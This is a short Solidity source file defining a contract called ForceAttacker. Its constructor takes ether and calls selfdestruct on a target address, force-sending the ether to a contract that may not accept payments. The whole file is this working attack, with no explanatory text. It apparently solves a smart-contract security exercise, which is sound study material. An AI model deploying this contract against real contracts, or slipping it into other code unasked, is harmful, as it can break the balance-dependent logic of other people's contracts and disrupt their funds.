// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

contract ForceAttacker {
    constructor (address payable target) payable {
        require(msg.value > 0);
        selfdestruct(target);
    }
}